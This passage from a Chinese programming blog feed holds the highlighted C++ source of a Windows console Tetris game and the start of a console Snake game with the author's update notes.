class="comment">//如果碰到了其他的方块, 退回一位</span></span><br><span class="line">			&#125;</span><br><span class="line">			printVector(movingBlock, dot); <span class="comment">//输出这次的图像</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			movingCenter.x -= <span class="number">1</span>;</span><br><span class="line">			printVector(movingBlock, dot); <span class="comment">//输出这次的图像</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">moveRight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">bool</span> touchRight = <span class="literal">false</span>;</span><br><span class="line">		printVector(movingBlock, blank);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; movingBlock.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			movingBlock[i].x += <span class="number">1</span>; <span class="comment">//向右移一位</span></span><br><span class="line">			<span class="keyword">if</span> (movingBlock[i].x &gt; WIDTH || fixedBlock[movingBlock[i].x - <span class="number">1</span>][movingBlock[i].y - <span class="number">1</span>] != <span class="number">0</span>) <span class="comment">//检查是否碰到右边界或者碰到固定的方块</span></span><br><span class="line">			&#123;</span><br><span class="line">				touchRight = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (touchRight)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; movingBlock.size(); ++i)</span><br><span class="line">			&#123;</span><br><span class="line">				movingBlock[i].x -= <span class="number">1</span>; <span class="comment">//如果碰到了其他的方块, 退回一位</span></span><br><span class="line">			&#125;</span><br><span class="line">			printVector(movingBlock, dot); <span class="comment">//输出这次的图像</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			movingCenter.x += <span class="number">1</span>;</span><br><span class="line">			printVector(movingBlock, dot); <span class="comment">//输出这次的图像</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">checkLines</span><span class="params">()</span> <span class="comment">//检查是否将连成一行</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> addPoints = <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; HIGHT; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">bool</span> isFullOfLine = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; WIDTH; ++j)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (fixedBlock[j][i] == <span class="number">0</span>) isFullOfLine = <span class="literal">false</span>; <span class="comment">//检查这一行是否是满的</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (isFullOfLine) <span class="comment">//如果是满的将上面的所有方块向下移一行</span></span><br><span class="line">			&#123;</span><br><span class="line">				score += addPoints;</span><br><span class="line">				addPoints *= <span class="number">2</span>; <span class="comment">//使得一次清空多行分数加倍</span></span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &gt; <span class="number">0</span>; --k)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; WIDTH; ++j)</span><br><span class="line">					&#123;</span><br><span class="line">						fixedBlock[j][k] = fixedBlock[j][k - <span class="number">1</span>];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;	</span><br><span class="line">		printFixedBlock(fixedBlock,currColor);</span><br><span class="line">		setColor(<span class="number">7</span>);<span class="comment">//切回白色</span></span><br><span class="line">		print(WIDTH / <span class="number">2</span> + <span class="number">4</span>, HIGHT + <span class="number">2</span>, to_string(score)); <span class="comment">//输出更新后的分数</span></span><br><span class="line">		setColor(currColor);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		setColor(BACKGROUND_RED);</span><br><span class="line">		print(WIDTH / <span class="number">2</span> - <span class="number">1</span>, HIGHT + <span class="number">3</span>, <span class="string">"GAME OVER!"</span>);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		setColor(<span class="number">7</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (KEY_DOWN(c))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> diffcult;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入难度(1~10): "</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; diffcult &amp;&amp; (diffcult &lt; <span class="number">1</span> || diffcult &gt;<span class="number">10</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入合法的难度!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入难度(1~10): "</span>;</span><br><span class="line">	&#125;</span><br><span class="line">        diffcult = <span class="number">11</span> - diffcult;</span><br><span class="line">        <span class="keyword">int</span> time = diffcult * <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	HideCursor();</span><br><span class="line">	myTetris tetris;</span><br><span class="line">	tetris.newBlock();</span><br><span class="line">	<span class="keyword">int</span> noKeyDownCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> moveCount = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)  <span class="comment">//操作逻辑是这样, 如果什么按键都没按, 达到一定次数就向下移一位, 同时次数清零. 如果是平移或者旋转, 达到一定次数同样向下移一位, 同时次数清零. 因为多线程容易导致BUG(方块错位等等), 最后还是选择单线程算了. 在单线程下这应该是最优解了0.0</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'O'</span>) || tetris.isDead)</span><br><span class="line">		&#123;</span><br><span class="line">			tetris.<span class="built_in">exit</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (noKeyDownCount == <span class="number">10</span> || moveCount == diffcult)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (tetris.moveDawn())</span><br><span class="line">			&#123;</span><br><span class="line">				tetris.checkLines();</span><br><span class="line">				tetris.newBlock();</span><br><span class="line">			&#125;</span><br><span class="line">			noKeyDownCount = <span class="number">0</span>;</span><br><span class="line">			moveCount = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'W'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			tetris.rotate();</span><br><span class="line">			moveCount++;</span><br><span class="line">			Sleep(<span class="number">100</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'A'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			tetris.moveLeft();</span><br><span class="line">			moveCount++;</span><br><span class="line">			Sleep(<span class="number">100</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'D'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			tetris.moveRight();</span><br><span class="line">			moveCount++;</span><br><span class="line">			Sleep(<span class="number">100</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'S'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (tetris.moveDawn())</span><br><span class="line">			&#123;</span><br><span class="line">				tetris.checkLines();</span><br><span class="line">				tetris.newBlock();</span><br><span class="line">			&#125;</span><br><span class="line">			moveCount = <span class="number">0</span>;</span><br><span class="line">			Sleep(<span class="number">20</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		noKeyDownCount++;</span><br><span class="line">		Sleep(time);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	Sleep(<span class="number">3000</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>game</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 控制台贪吃蛇</title>
    <url>/2017/12/14/C++%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%B4%AA%E5%90%83%E8%9B%87/</url>
    <content><![CDATA[<p>无聊写的… 效率感人…  别人写的都是越到后面越难, 我这个是越来越简单 （逃 Update in 2017/12/15 我终于知道什么原因了. 我！T！M！D！的写错了…  脑子一抽把输出写到for()里面了, 导致随着蛇的长度增加重复输出就很卡 QAQ 现在这个版本已经修好了 (顺便加了点功能 逃 Update in 2017/12/17 换了一种输出方式, 效率疯狂up, 顺便修了点bug. </p>
<a id="more"></a>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DOWN 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UP 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) &amp; 0x8000) ? 1:0) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> isDIRECTION true <span class="comment">//是否显示头部方向</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> CONSIZE;</span><br><span class="line"><span class="keyword">int</span> direction = UP;</span><br><span class="line"><span class="keyword">bool</span> isTurned = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	COORD coord; <span class="comment">// coordinates  </span></span><br><span class="line">	coord.X = x; coord.Y = y; <span class="comment">// X and Y coordinates  </span></span><br><span class="line">	SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord); <span class="comment">// moves to the coordinates  </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myscreen</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">string</span> dot = <span class="string">"■"</span>;</span><br><span class="line">	<span class="built_in">string</span> blank = <span class="string">"  "</span>;</span><br><span class="line">	<span class="built_in">string</span> target = <span class="string">"○"</span>;</span><br><span class="line">	<span class="built_in">string</span> up = <span class="string">"↑"</span>;</span><br><span class="line">	<span class="built_in">string</span> left = <span class="string">"←"</span>; </span><br><span class="line">	<span class="built_in">string</span> right = <span class="string">"→"</span>;</span><br><span class="line">	<span class="built_in">string</span> down = <span class="string">"↓"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysnake</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; snake;  <span class="comment">//第一维代表蛇的一个身体, 第二维两个参数代表x和y</span></span><br><span class="line">	Myscreen screen;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; target;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> direction)</span></span></span><br><span class="line"><span class="function">	</span>&#123;		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; snake.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (isDIRECTION)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">switch</span> (direction)</span><br><span class="line">					&#123;</span><br><span class="line">					<span class="keyword">case</span> UP:</span><br><span class="line">						gotoxy(snake[i][<span class="number">0</span>] * <span class="number">2</span>, snake[i][<span class="number">1</span>]);</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; screen.up;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> DOWN:</span><br><span class="line">						gotoxy(snake[i][<span class="number">0</span>] * <span class="number">2</span>, snake[i][<span class="number">1</span>]);</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; screen.down;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> LEFT:</span><br><span class="line">						gotoxy(snake[i][<span class="number">0</span>] * <span class="number">2</span>, snake[i][<span class="number">1</span>]);</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; screen.left;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> RIGHT:</span><br><span class="line">						gotoxy(snake[i][<span class="number">0</span>] * <span class="number">2</span>, snake[i][<span class="number">1</span>]);</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; screen.right;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					gotoxy(snake[i][<span class="number">0</span>] * <span class="number">2</span>, snake[i][<span class="number">1</span>]);</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; screen.dot;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				gotoxy(snake[i][<span class="number">0</span>] * <span class="number">2</span>, snake[i][<span class="number">1</span>]);</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; screen.dot;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">detecter</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> x = snake[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span> y = snake[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span> (x == target[<span class="number">0</span>] &amp;&amp; y == target[<span class="number">1</span>]) <span class="comment">//如果头的位置和目标相同, 返回true</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; snake.size() - <span class="number">1</span>; ++i) <span class="comment">//如果头的位置和蛇身体(除了自己的尾巴)相同, 将isDead设为true</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">0</span>] == snake[i][<span class="number">0</span>] &amp;&amp; snake[<span class="number">0</span>][<span class="number">1</span>] == snake[i][<span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				isDead = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//都不相同返回false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">delteLast</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		gotoxy(snake[snake.size() - <span class="number">1</span>][<span class="number">0</span>]*<span class="number">2</span>, snake[snake.size() - <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; screen.blank;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">bool</span> isDead = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> socre = <span class="number">-1</span>; <span class="comment">//初始化时会执行一次newtarget, 所以是-1</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newTarget</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="function">default_random_engine <span class="title">e</span><span class="params">(<span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(time(<span class="number">0</span>)))</span></span>;</span><br><span class="line">		<span class="keyword">static</span> <span class="built_in">std</span>::uniform_int_distribution&lt;<span class="keyword">unsigned</span>&gt; u(<span class="number">1</span>, CONSIZE);</span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> randx = u(e);</span><br><span class="line">			<span class="keyword">int</span> randy = u(e);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; snake.size(); ++i)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> ((randx == snake[i][<span class="number">0</span>]) &amp;&amp; (randy == snake[i][<span class="number">1</span>])) <span class="comment">//如果目标与蛇的一部分重叠, 就重新生成一个数</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">goto</span> retry;</span><br><span class="line">				&#125;	</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			target.clear(); <span class="comment">//将之前得到的目标清空</span></span><br><span class="line">			target.push_back(randx);</span><br><span class="line">			target.push_back(randy);</span><br><span class="line">			gotoxy(randx * <span class="number">2</span>, randy);</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; screen.target;</span><br><span class="line">			socre++;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		retry:</span><br><span class="line">			<span class="keyword">continue</span>; <span class="comment">//编译器要求这里要有一行233</span></span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		<span class="built_in">string</span> commond;</span><br><span class="line">		commond = <span class="string">"mode con cols="</span>+to_string(CONSIZE*<span class="number">2</span>+<span class="number">5</span>) +<span class="string">" lines="</span>+ to_string(CONSIZE + <span class="number">6</span>); <span class="comment">//调整窗口大小</span></span><br><span class="line">		system(commond.c_str());</span><br><span class="line">		system(<span class="string">"cls"</span>);<span class="comment">//清屏</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CONSIZE * <span class="number">2</span> + <span class="number">4</span>; ++i) <span class="comment">//生成顶部,有边缘的原因, 所以额外+4</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"┌"</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (i == CONSIZE * <span class="number">2</span> + <span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"┐"</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"─"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		gotoxy(<span class="number">0</span>, CONSIZE+<span class="number">1</span>);<span class="comment">//跳到底部</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CONSIZE * <span class="number">2</span> + <span class="number">4</span>; ++i) <span class="comment">//生成底部,有边缘的原因, 所以额外+4</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"└"</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (i == CONSIZE * <span class="number">2</span> + <span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"┘"</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"─"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; CONSIZE+<span class="number">1</span> ; ++i) <span class="comment">//生成左右边框</span></span><br><span class="line">		&#123;</span><br><span class="line">			gotoxy(<span class="number">0</span>, i);</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"│"</span>;</span><br><span class="line">			gotoxy(CONSIZE * <span class="number">2</span> + <span class="number">3</span>, i); <span class="comment">//跳到右边</span></span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"│"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		gotoxy(CONSIZE/<span class="number">2</span>\*<span class="number">2</span> <span class="number">-2</span>, CONSIZE + <span class="number">2</span>); <span class="comment">//x=CONSIZE/2\*2 -6(3个汉字) +4(两个边框)</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"贪吃蛇"</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; body; </span><br><span class="line">		body.push_back(CONSIZE / <span class="number">2</span>);</span><br><span class="line">		body.push_back(CONSIZE / <span class="number">2</span>);</span><br><span class="line">		snake.push_back(body); <span class="comment">//生成第一个蛇的身体</span></span><br><span class="line">		output(UP);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">forward</span><span class="params">(<span class="keyword">int</span> direction)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; body;</span><br><span class="line">		<span class="keyword">switch</span> (direction)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> UP:</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">1</span>] == <span class="number">1</span>) <span class="comment">//如果在第一行, 直接添加到最后一行</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(CONSIZE);            <span class="comment">//添加一个身体到最后一行</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体</span></span><br><span class="line">				&#123;		</span><br><span class="line">					delteLast();</span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>] - <span class="number">1</span>); <span class="comment">//添加一个身体到第一个身体的上面	</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体</span></span><br><span class="line">				&#123;		</span><br><span class="line">					delteLast();</span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DOWN:</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">1</span>] == CONSIZE) <span class="comment">//如果在最后一行, 直接添加到第一行</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(<span class="number">1</span>);               <span class="comment">//添加一个身体到第一行		</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体,吃到了不删除相当于增长了</span></span><br><span class="line">				&#123;		</span><br><span class="line">					delteLast(); <span class="comment">//清空最后一个身体处的的区域</span></span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>] + <span class="number">1</span>); <span class="comment">//添加一个身体到第一个身体的下面</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体</span></span><br><span class="line">				&#123;			</span><br><span class="line">					delteLast();</span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> RIGHT:</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">0</span>] == CONSIZE) <span class="comment">//如果在最右一列, 直接添加到第一列</span></span><br><span class="line">			